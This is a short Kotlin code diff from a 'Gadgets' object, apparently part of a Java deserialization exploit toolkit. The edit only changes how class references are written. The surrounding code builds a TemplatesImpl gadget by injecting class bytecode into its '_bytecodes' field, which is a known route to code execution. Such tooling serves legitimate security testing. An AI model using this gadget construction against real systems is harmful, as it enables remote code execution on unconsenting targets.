@@ -8,8 +8,8 @@ object Gadgets {
 
     fun createTemplatesImpl(c: Class<*>) = createTemplatesImpl(
         c,
-        TemplatesImpl::class.java,
-        TransformerFactoryImpl::class.java
+        clazz<TemplatesImpl>(),
+        clazz<TransformerFactoryImpl>()
     )
 
     fun createTemplatesImpl(
@@ -20,7 +20,7 @@ object Gadgets {
         val templates = tplClass.newInstance()
 
         // inject class bytes into instance
-        templates.setFieldValue("_bytecodes", arrayOf(c.asByte(), Foo::class.java.asByte()))
+        templates.setFieldValue("_bytecodes", arrayOf(c.asByte(), clazz<Foo>().asByte()))
 
         // required to make TemplatesImpl happy
         templates.setFieldValue("_name", "Pwnr")
